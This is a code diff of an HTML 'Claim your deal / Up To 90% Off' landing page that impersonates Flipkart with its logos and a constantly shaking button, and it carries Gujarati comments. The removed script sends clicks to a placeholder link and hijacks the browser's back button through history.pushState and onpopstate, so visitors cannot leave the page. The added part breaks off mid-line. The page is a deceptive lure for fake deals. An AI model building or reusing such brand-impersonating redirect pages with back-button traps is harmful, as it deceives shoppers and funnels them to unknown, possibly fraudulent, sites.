@@ -12,93 +12,53 @@
             overflow: hidden;
         }
 
-        /* Floating Logos Background */
+        /* લોગો તરવા માટેનું એનિમેશન */
         @keyframes float {
             0% { transform: translate(0, 0) rotate(0deg); }
-            50% { transform: translate(50px, 50px) rotate(180deg); }
+            50% { transform: translate(40px, 40px) rotate(180deg); }
             100% { transform: translate(0, 0) rotate(360deg); }
         }
+
         .floating-logo {
-            position: absolute; width: 60px; opacity: 0.15; z-index: 1; pointer-events: none;
+            position: absolute; width: 50px; opacity: 0.18; z-index: 1; pointer-events: none;
         }
 
         .container { text-align: center; z-index: 10; position: relative; width: 100%; }
 
         .top-text { 
-            font-size: 16px; 
-            font-weight: bold; 
-            color: #ffffff; 
-            margin-bottom: 10px; 
-            letter-spacing: 0.5px;
+            font-size: 16px; font-weight: bold; color: #ffffff; 
+            margin-bottom: 12px; text-transform: uppercase;
         }
 
-        /* શોર્ટ અને ગોળ બટન (Perfect Size) */
+        /* બટન હાલવા (Shake) માટેનું એનિમેશન */
+        @keyframes shakeEffect {
+            0% { transform: scale(1); }
+            10% { transform: scale(1.1) rotate(-3deg); }
+            20% { transform: scale(1.1) rotate(3deg); }
+            30% { transform: scale(1.1) rotate(-3deg); }
+            40% { transform: scale(1.1) rotate(3deg); }
+            50% { transform: scale(1); }
+            100% { transform: scale(1); }
+        }
+
         .flipkart-button {
-            background-color: #ffe11b; 
-            color: #212121;
-            padding: 12px 30px; /* પહોળાઈ ઘટાડીને શોર્ટ કર્યું */
-            border: none;
-            border-radius: 50px; 
-            cursor: pointer;
-            box-shadow: 0 4px 12px rgba(0,0,0,0.3);
-            display: inline-block;
-            text-decoration: none;
-            transition: 0.1s;
+            background-color: #ffe11b; color: #212121;
+            padding: 12px 35px; border: none; border-radius: 50px; 
+            cursor: pointer; box-shadow: 0 5px 15px rgba(0,0,0,0.3);
+            display: inline-block; text-decoration: none;
+            animation: shakeEffect 1.5s infinite ease-in-out; /* સતત હાલશે */
         }
 
-        .offer-text { 
-            font-size: 18px; 
-            font-weight: 800; 
-            display: block; 
-            line-height: 1;
-        }
-
-        .click-here-text { 
-            font-size: 11px; 
-            display: block; 
-            margin-top: 3px;
-            font-weight: bold;
-            opacity: 0.9;
-        }
+        .offer-text { font-size: 18px; font-weight: 800; display: block; line-height: 1; }
+        .click-here-text { font-size: 11px; display: block; margin-top: 3px; font-weight: bold; }
     </style>
 </head>
 <body>
 
-    <img src="https://seeklogo.com/images/F/flipkart-logo-3F33927DAA-seeklogo.com.png" class="floating-logo" style="top:10%; left:10%; animation: float 15s infinite linear;">
-    <img src="https://seeklogo.com/images/F/flipkart-logo-3F33927DAA-seeklogo.com.png" class="floating-logo" style="top:70%; left:15%; animation: float 20s infinite linear;">
-    <img src="https://seeklogo.com/images/F/flipkart-logo-3F33927DAA-seeklogo.com.png" class="floating-logo" style="top:40%; left:80%; animation: float 18s infinite linear;">
-
-    <div class="container">
-        <div class="top-text">Claim your deal</div>
-        
-        <a href="https://તમારી-લિંક-અહીં-મૂકો.com" class="flipkart-button" onclick="doFastRedirect(event)">
-            <span class="offer-text">Up To 90% Off</span>
-            <span class="click-here-text">Click Here</span>
-        </a>
-    </div>
-
-    <script>
-        // અહીં તમારી ફાઈનલ લિંક નાખો
-        var targetUrl = "https://તમારી-લિંક-અહીં-મૂકો.com"; 
-
-        // ક્લિક કરતાની સાથે જ ઇન્સ્ટન્ટ રિડાયરેક્ટ
-        function doFastRedirect(e) {
-            e.preventDefault();
-            window.location.replace(targetUrl); 
-        }
-
-        // પેજ લોડ થતાની સાથે જ બેક બટન લોક કરી દેશે
-        window.onload = function() {
-            window.history.pushState(null, null, window.location.href);
-            window.onpopstate = function() {
-                window.location.replace(targetUrl);
-            };
-        };
-
-        // જો યુઝર ગમે ત્યાં ક્લિક કરે તો પણ ફાસ્ટ રિડાયરેક્ટ ટ્રિગર થશે
-        document.body.addEventListener('touchstart', function() {
-            window.history.pushState(null, null, window.location.href);
-        }, false);
-    </script>
-</body>
-</html>
+    <img src="https://seeklogo.com/images/F/flipkart-logo-3F33927DAA-seeklogo.com.png" class="floating-logo" style="top:5%; left:5%; animation: float 12s infinite linear;">
+    <img src="https://seeklogo.com/images/F/flipkart-logo-3F33927DAA-seeklogo.com.png" class="floating-logo" style="top:15%; left:85%; animation: float 18s infinite linear;">
+    <img src="https://seeklogo.com/images/F/flipkart-logo-3F33927DAA-seeklogo.com.png" class="floating-logo" style="top:50%; left:10%; animation: float 15s infinite linear;">
+    <img src="https://seeklogo.com/images/F/flipkart-logo-3F33927DAA-seeklogo.com.png" class="floating-logo" style="top:80%; left:20%; animation: float 20s infinite linear;">
+    <img src="https://seeklogo.com/images/F/flipkart-logo-3F33927DAA-seeklogo.com.png" class="floating-logo" style="top:40%; left:75%; animation: float 14s infinite linear;">
+    <img src="https://seeklogo.com/images/F/flipkart-logo-3F33927DAA-seeklogo.com.png" class="floating-logo" style="top:85%; left:80%; animation: float 16s infinite linear;">
+    <img src="https://seeklogo.com/images/F/flipkart-logo-3F33927DAA-seeklogo.com.png" class="floating-logo" style="top:10%; left:45%; animation:
